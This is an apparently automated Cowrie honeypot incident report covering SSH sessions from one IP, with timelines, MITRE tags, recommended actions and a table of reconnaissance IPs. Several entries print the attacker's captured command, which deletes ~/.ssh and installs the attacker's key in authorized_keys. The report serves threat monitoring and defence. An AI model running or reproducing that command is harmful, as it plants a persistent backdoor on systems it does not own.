| `2026-05-13 06:04:14` | `cowrie.session.connect` |
| `2026-05-13 06:04:14` | `cowrie.client.version` |
| `2026-05-13 06:04:14` | `cowrie.client.kex` |
| `2026-05-13 06:04:14` | `cowrie.login.success` |
| `2026-05-13 06:04:15` | `cowrie.session.params` |
| `2026-05-13 06:04:15` | `cowrie.command.input` |
| `2026-05-13 06:04:15` | `cowrie.command.failed` |
| `2026-05-13 06:04:15` | `cowrie.log.closed` |
| `2026-05-13 06:04:15` | `cowrie.session.params` |
| `2026-05-13 06:04:15` | `cowrie.command.input` |
| `2026-05-13 06:04:15` | `cowrie.session.file_download` |
| `2026-05-13 06:04:15` | `cowrie.log.closed` |
| `2026-05-13 06:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d48d360ec23

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:04 |
| **Last Seen** | 2026-05-13 06:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:04:17` | `cowrie.session.connect` |
| `2026-05-13 06:04:17` | `cowrie.client.version` |
| `2026-05-13 06:04:17` | `cowrie.client.kex` |
| `2026-05-13 06:04:17` | `cowrie.login.success` |
| `2026-05-13 06:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2b27a4b041d

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:16 |
| **Last Seen** | 2026-05-13 06:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:16:15` | `cowrie.session.connect` |
| `2026-05-13 06:16:15` | `cowrie.client.version` |
| `2026-05-13 06:16:15` | `cowrie.client.kex` |
| `2026-05-13 06:16:16` | `cowrie.login.success` |
| `2026-05-13 06:16:16` | `cowrie.session.params` |
| `2026-05-13 06:16:16` | `cowrie.command.input` |
| `2026-05-13 06:16:16` | `cowrie.command.failed` |
| `2026-05-13 06:16:16` | `cowrie.log.closed` |
| `2026-05-13 06:16:16` | `cowrie.session.params` |
| `2026-05-13 06:16:16` | `cowrie.command.input` |
| `2026-05-13 06:16:16` | `cowrie.session.file_download` |
| `2026-05-13 06:16:16` | `cowrie.log.closed` |
| `2026-05-13 06:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a51836e43cdd

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:16 |
| **Last Seen** | 2026-05-13 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:16:18` | `cowrie.session.connect` |
| `2026-05-13 06:16:18` | `cowrie.client.version` |
| `2026-05-13 06:16:18` | `cowrie.client.kex` |
| `2026-05-13 06:16:18` | `cowrie.login.success` |
| `2026-05-13 06:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2330973c00ad

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:25 |
| **Last Seen** | 2026-05-13 06:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:25:28` | `cowrie.session.connect` |
| `2026-05-13 06:25:28` | `cowrie.client.version` |
| `2026-05-13 06:25:28` | `cowrie.client.kex` |
| `2026-05-13 06:25:28` | `cowrie.login.success` |
| `2026-05-13 06:25:28` | `cowrie.session.params` |
| `2026-05-13 06:25:28` | `cowrie.command.input` |
| `2026-05-13 06:25:28` | `cowrie.command.failed` |
| `2026-05-13 06:25:28` | `cowrie.log.closed` |
| `2026-05-13 06:25:28` | `cowrie.session.params` |
| `2026-05-13 06:25:28` | `cowrie.command.input` |
| `2026-05-13 06:25:28` | `cowrie.session.file_download` |
| `2026-05-13 06:25:28` | `cowrie.log.closed` |
| `2026-05-13 06:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb9744d4ca0

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:25 |
| **Last Seen** | 2026-05-13 06:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:25:30` | `cowrie.session.connect` |
| `2026-05-13 06:25:30` | `cowrie.client.version` |
| `2026-05-13 06:25:30` | `cowrie.client.kex` |
| `2026-05-13 06:25:31` | `cowrie.login.success` |
| `2026-05-13 06:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c013dca6a57

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:28 |
| **Last Seen** | 2026-05-13 06:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:28:20` | `cowrie.session.connect` |
| `2026-05-13 06:28:20` | `cowrie.client.version` |
| `2026-05-13 06:28:20` | `cowrie.client.kex` |
| `2026-05-13 06:28:21` | `cowrie.login.success` |
| `2026-05-13 06:28:21` | `cowrie.session.params` |
| `2026-05-13 06:28:21` | `cowrie.command.input` |
| `2026-05-13 06:28:21` | `cowrie.command.failed` |
| `2026-05-13 06:28:21` | `cowrie.log.closed` |
| `2026-05-13 06:28:21` | `cowrie.session.params` |
| `2026-05-13 06:28:21` | `cowrie.command.input` |
| `2026-05-13 06:28:21` | `cowrie.session.file_download` |
| `2026-05-13 06:28:21` | `cowrie.log.closed` |
| `2026-05-13 06:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9acaf655c459

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:28 |
| **Last Seen** | 2026-05-13 06:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:28:23` | `cowrie.session.connect` |
| `2026-05-13 06:28:23` | `cowrie.client.version` |
| `2026-05-13 06:28:23` | `cowrie.client.kex` |
| `2026-05-13 06:28:23` | `cowrie.login.success` |
| `2026-05-13 06:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1cdd0028049

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:31 |
| **Last Seen** | 2026-05-13 06:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:31:17` | `cowrie.session.connect` |
| `2026-05-13 06:31:18` | `cowrie.client.version` |
| `2026-05-13 06:31:18` | `cowrie.client.kex` |
| `2026-05-13 06:31:18` | `cowrie.login.success` |
| `2026-05-13 06:31:18` | `cowrie.session.params` |
| `2026-05-13 06:31:18` | `cowrie.command.input` |
| `2026-05-13 06:31:18` | `cowrie.command.failed` |
| `2026-05-13 06:31:18` | `cowrie.log.closed` |
| `2026-05-13 06:31:19` | `cowrie.session.params` |
| `2026-05-13 06:31:19` | `cowrie.command.input` |
| `2026-05-13 06:31:19` | `cowrie.session.file_download` |
| `2026-05-13 06:31:19` | `cowrie.log.closed` |
| `2026-05-13 06:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff49238ace9

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:31 |
| **Last Seen** | 2026-05-13 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:31:20` | `cowrie.session.connect` |
| `2026-05-13 06:31:20` | `cowrie.client.version` |
| `2026-05-13 06:31:20` | `cowrie.client.kex` |
| `2026-05-13 06:31:21` | `cowrie.login.success` |
| `2026-05-13 06:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17817895c8c2

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:34 |
| **Last Seen** | 2026-05-13 06:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:34:20` | `cowrie.session.connect` |
| `2026-05-13 06:34:20` | `cowrie.client.version` |
| `2026-05-13 06:34:20` | `cowrie.client.kex` |
| `2026-05-13 06:34:20` | `cowrie.login.success` |
| `2026-05-13 06:34:21` | `cowrie.session.params` |
| `2026-05-13 06:34:21` | `cowrie.command.input` |
| `2026-05-13 06:34:21` | `cowrie.command.failed` |
| `2026-05-13 06:34:21` | `cowrie.log.closed` |
| `2026-05-13 06:34:21` | `cowrie.session.params` |
| `2026-05-13 06:34:21` | `cowrie.command.input` |
| `2026-05-13 06:34:21` | `cowrie.session.file_download` |
| `2026-05-13 06:34:21` | `cowrie.log.closed` |
| `2026-05-13 06:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38ac0d4ada5

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:34 |
| **Last Seen** | 2026-05-13 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:34:23` | `cowrie.session.connect` |
| `2026-05-13 06:34:23` | `cowrie.client.version` |
| `2026-05-13 06:34:23` | `cowrie.client.kex` |
| `2026-05-13 06:34:23` | `cowrie.login.success` |
| `2026-05-13 06:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176f7a2cd748

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:40 |
| **Last Seen** | 2026-05-13 06:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:40:40` | `cowrie.session.connect` |
| `2026-05-13 06:40:40` | `cowrie.client.version` |
| `2026-05-13 06:40:40` | `cowrie.client.kex` |
| `2026-05-13 06:40:40` | `cowrie.login.success` |
| `2026-05-13 06:40:40` | `cowrie.session.params` |
| `2026-05-13 06:40:40` | `cowrie.command.input` |
| `2026-05-13 06:40:40` | `cowrie.command.failed` |
| `2026-05-13 06:40:40` | `cowrie.log.closed` |
| `2026-05-13 06:40:41` | `cowrie.session.params` |
| `2026-05-13 06:40:41` | `cowrie.command.input` |
| `2026-05-13 06:40:41` | `cowrie.session.file_download` |
| `2026-05-13 06:40:41` | `cowrie.log.closed` |
| `2026-05-13 06:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4908e3054358

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:40 |
| **Last Seen** | 2026-05-13 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:40:42` | `cowrie.session.connect` |
| `2026-05-13 06:40:42` | `cowrie.client.version` |
| `2026-05-13 06:40:42` | `cowrie.client.kex` |
| `2026-05-13 06:40:43` | `cowrie.login.success` |
| `2026-05-13 06:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096b3825bb3a

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:43 |
| **Last Seen** | 2026-05-13 06:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:43:51` | `cowrie.session.connect` |
| `2026-05-13 06:43:51` | `cowrie.client.version` |
| `2026-05-13 06:43:51` | `cowrie.client.kex` |
| `2026-05-13 06:43:52` | `cowrie.login.success` |
| `2026-05-13 06:43:52` | `cowrie.session.params` |
| `2026-05-13 06:43:52` | `cowrie.command.input` |
| `2026-05-13 06:43:52` | `cowrie.command.failed` |
| `2026-05-13 06:43:52` | `cowrie.log.closed` |
| `2026-05-13 06:43:52` | `cowrie.session.params` |
| `2026-05-13 06:43:52` | `cowrie.command.input` |
| `2026-05-13 06:43:52` | `cowrie.session.file_download` |
| `2026-05-13 06:43:52` | `cowrie.log.closed` |
| `2026-05-13 06:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48da5a644888

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:43 |
| **Last Seen** | 2026-05-13 06:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:43:54` | `cowrie.session.connect` |
| `2026-05-13 06:43:54` | `cowrie.client.version` |
| `2026-05-13 06:43:54` | `cowrie.client.kex` |
| `2026-05-13 06:43:54` | `cowrie.login.success` |
| `2026-05-13 06:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `23.94.77[.]145` | **170** | 2026-05-13 03:45 | 2026-05-13 06:50 | 82m | 0 | `T1592` | 🟠 MEDIUM |
| `103.49.238[.]35` | **17** | 2026-05-13 05:51 | 2026-05-13 06:50 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.119.11[.]223` | **3** | 2026-05-13 05:24 | 2026-05-13 05:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]58` | **2** | 2026-05-13 06:10 | 2026-05-13 06:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.84.117[.]117` | **2** | 2026-05-13 04:22 | 2026-05-13 04:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.15.51[.]236` | 1 | 2026-05-13 04:03 | 2026-05-13 04:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `107.150.119[.]80` | 1 | 2026-05-13 04:34 | 2026-05-13 04:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.166.87[.]119` | 1 | 2026-05-13 04:32 | 2026-05-13 04:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-05-13 05:05 | 2026-05-13 05:06 | 60s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.123[.]76` | 1 | 2026-05-13 05:40 | 2026-05-13 05:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.37.66[.]15` | 1 | 2026-05-13 04:27 | 2026-05-13 04:27 | 13s | 0 | `T1592` | 🟢 LOW |
| `138.68.76[.]249` | 1 | 2026-05-13 04:16 | 2026-05-13 04:16 | 8s | 0 | `T1592` | 🟢 LOW |
| `14.103.119[.]118` | 1 | 2026-05-13 05:39 | 2026-05-13 05:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.96.182[.]111` | 1 | 2026-05-13 04:10 | 2026-05-13 04:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.180.59[.]208` | 1 | 2026-05-13 05:29 | 2026-05-13 05:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.42.93[.]139` | 1 | 2026-05-13 04:38 | 2026-05-13 04:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.181.4[.]12` | 1 | 2026-05-13 04:06 | 2026-05-13 04:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `205.185.121[.]144` | 1 | 2026-05-13 04:35 | 2026-05-13 04:35 | 46s | 0 | `T1592` | 🟢 LOW |
| `222.118.160[.]173` | 1 | 2026-05-13 05:59 | 2026-05-13 06:00 | 13s | 0 | `T1592` | 🟢 LOW |
| `223.247.218[.]112` | 1 | 2026-05-13 04:04 | 2026-05-13 04:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `38.137.11[.]14` | 1 | 2026-05-13 04:32 | 2026-05-13 04:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
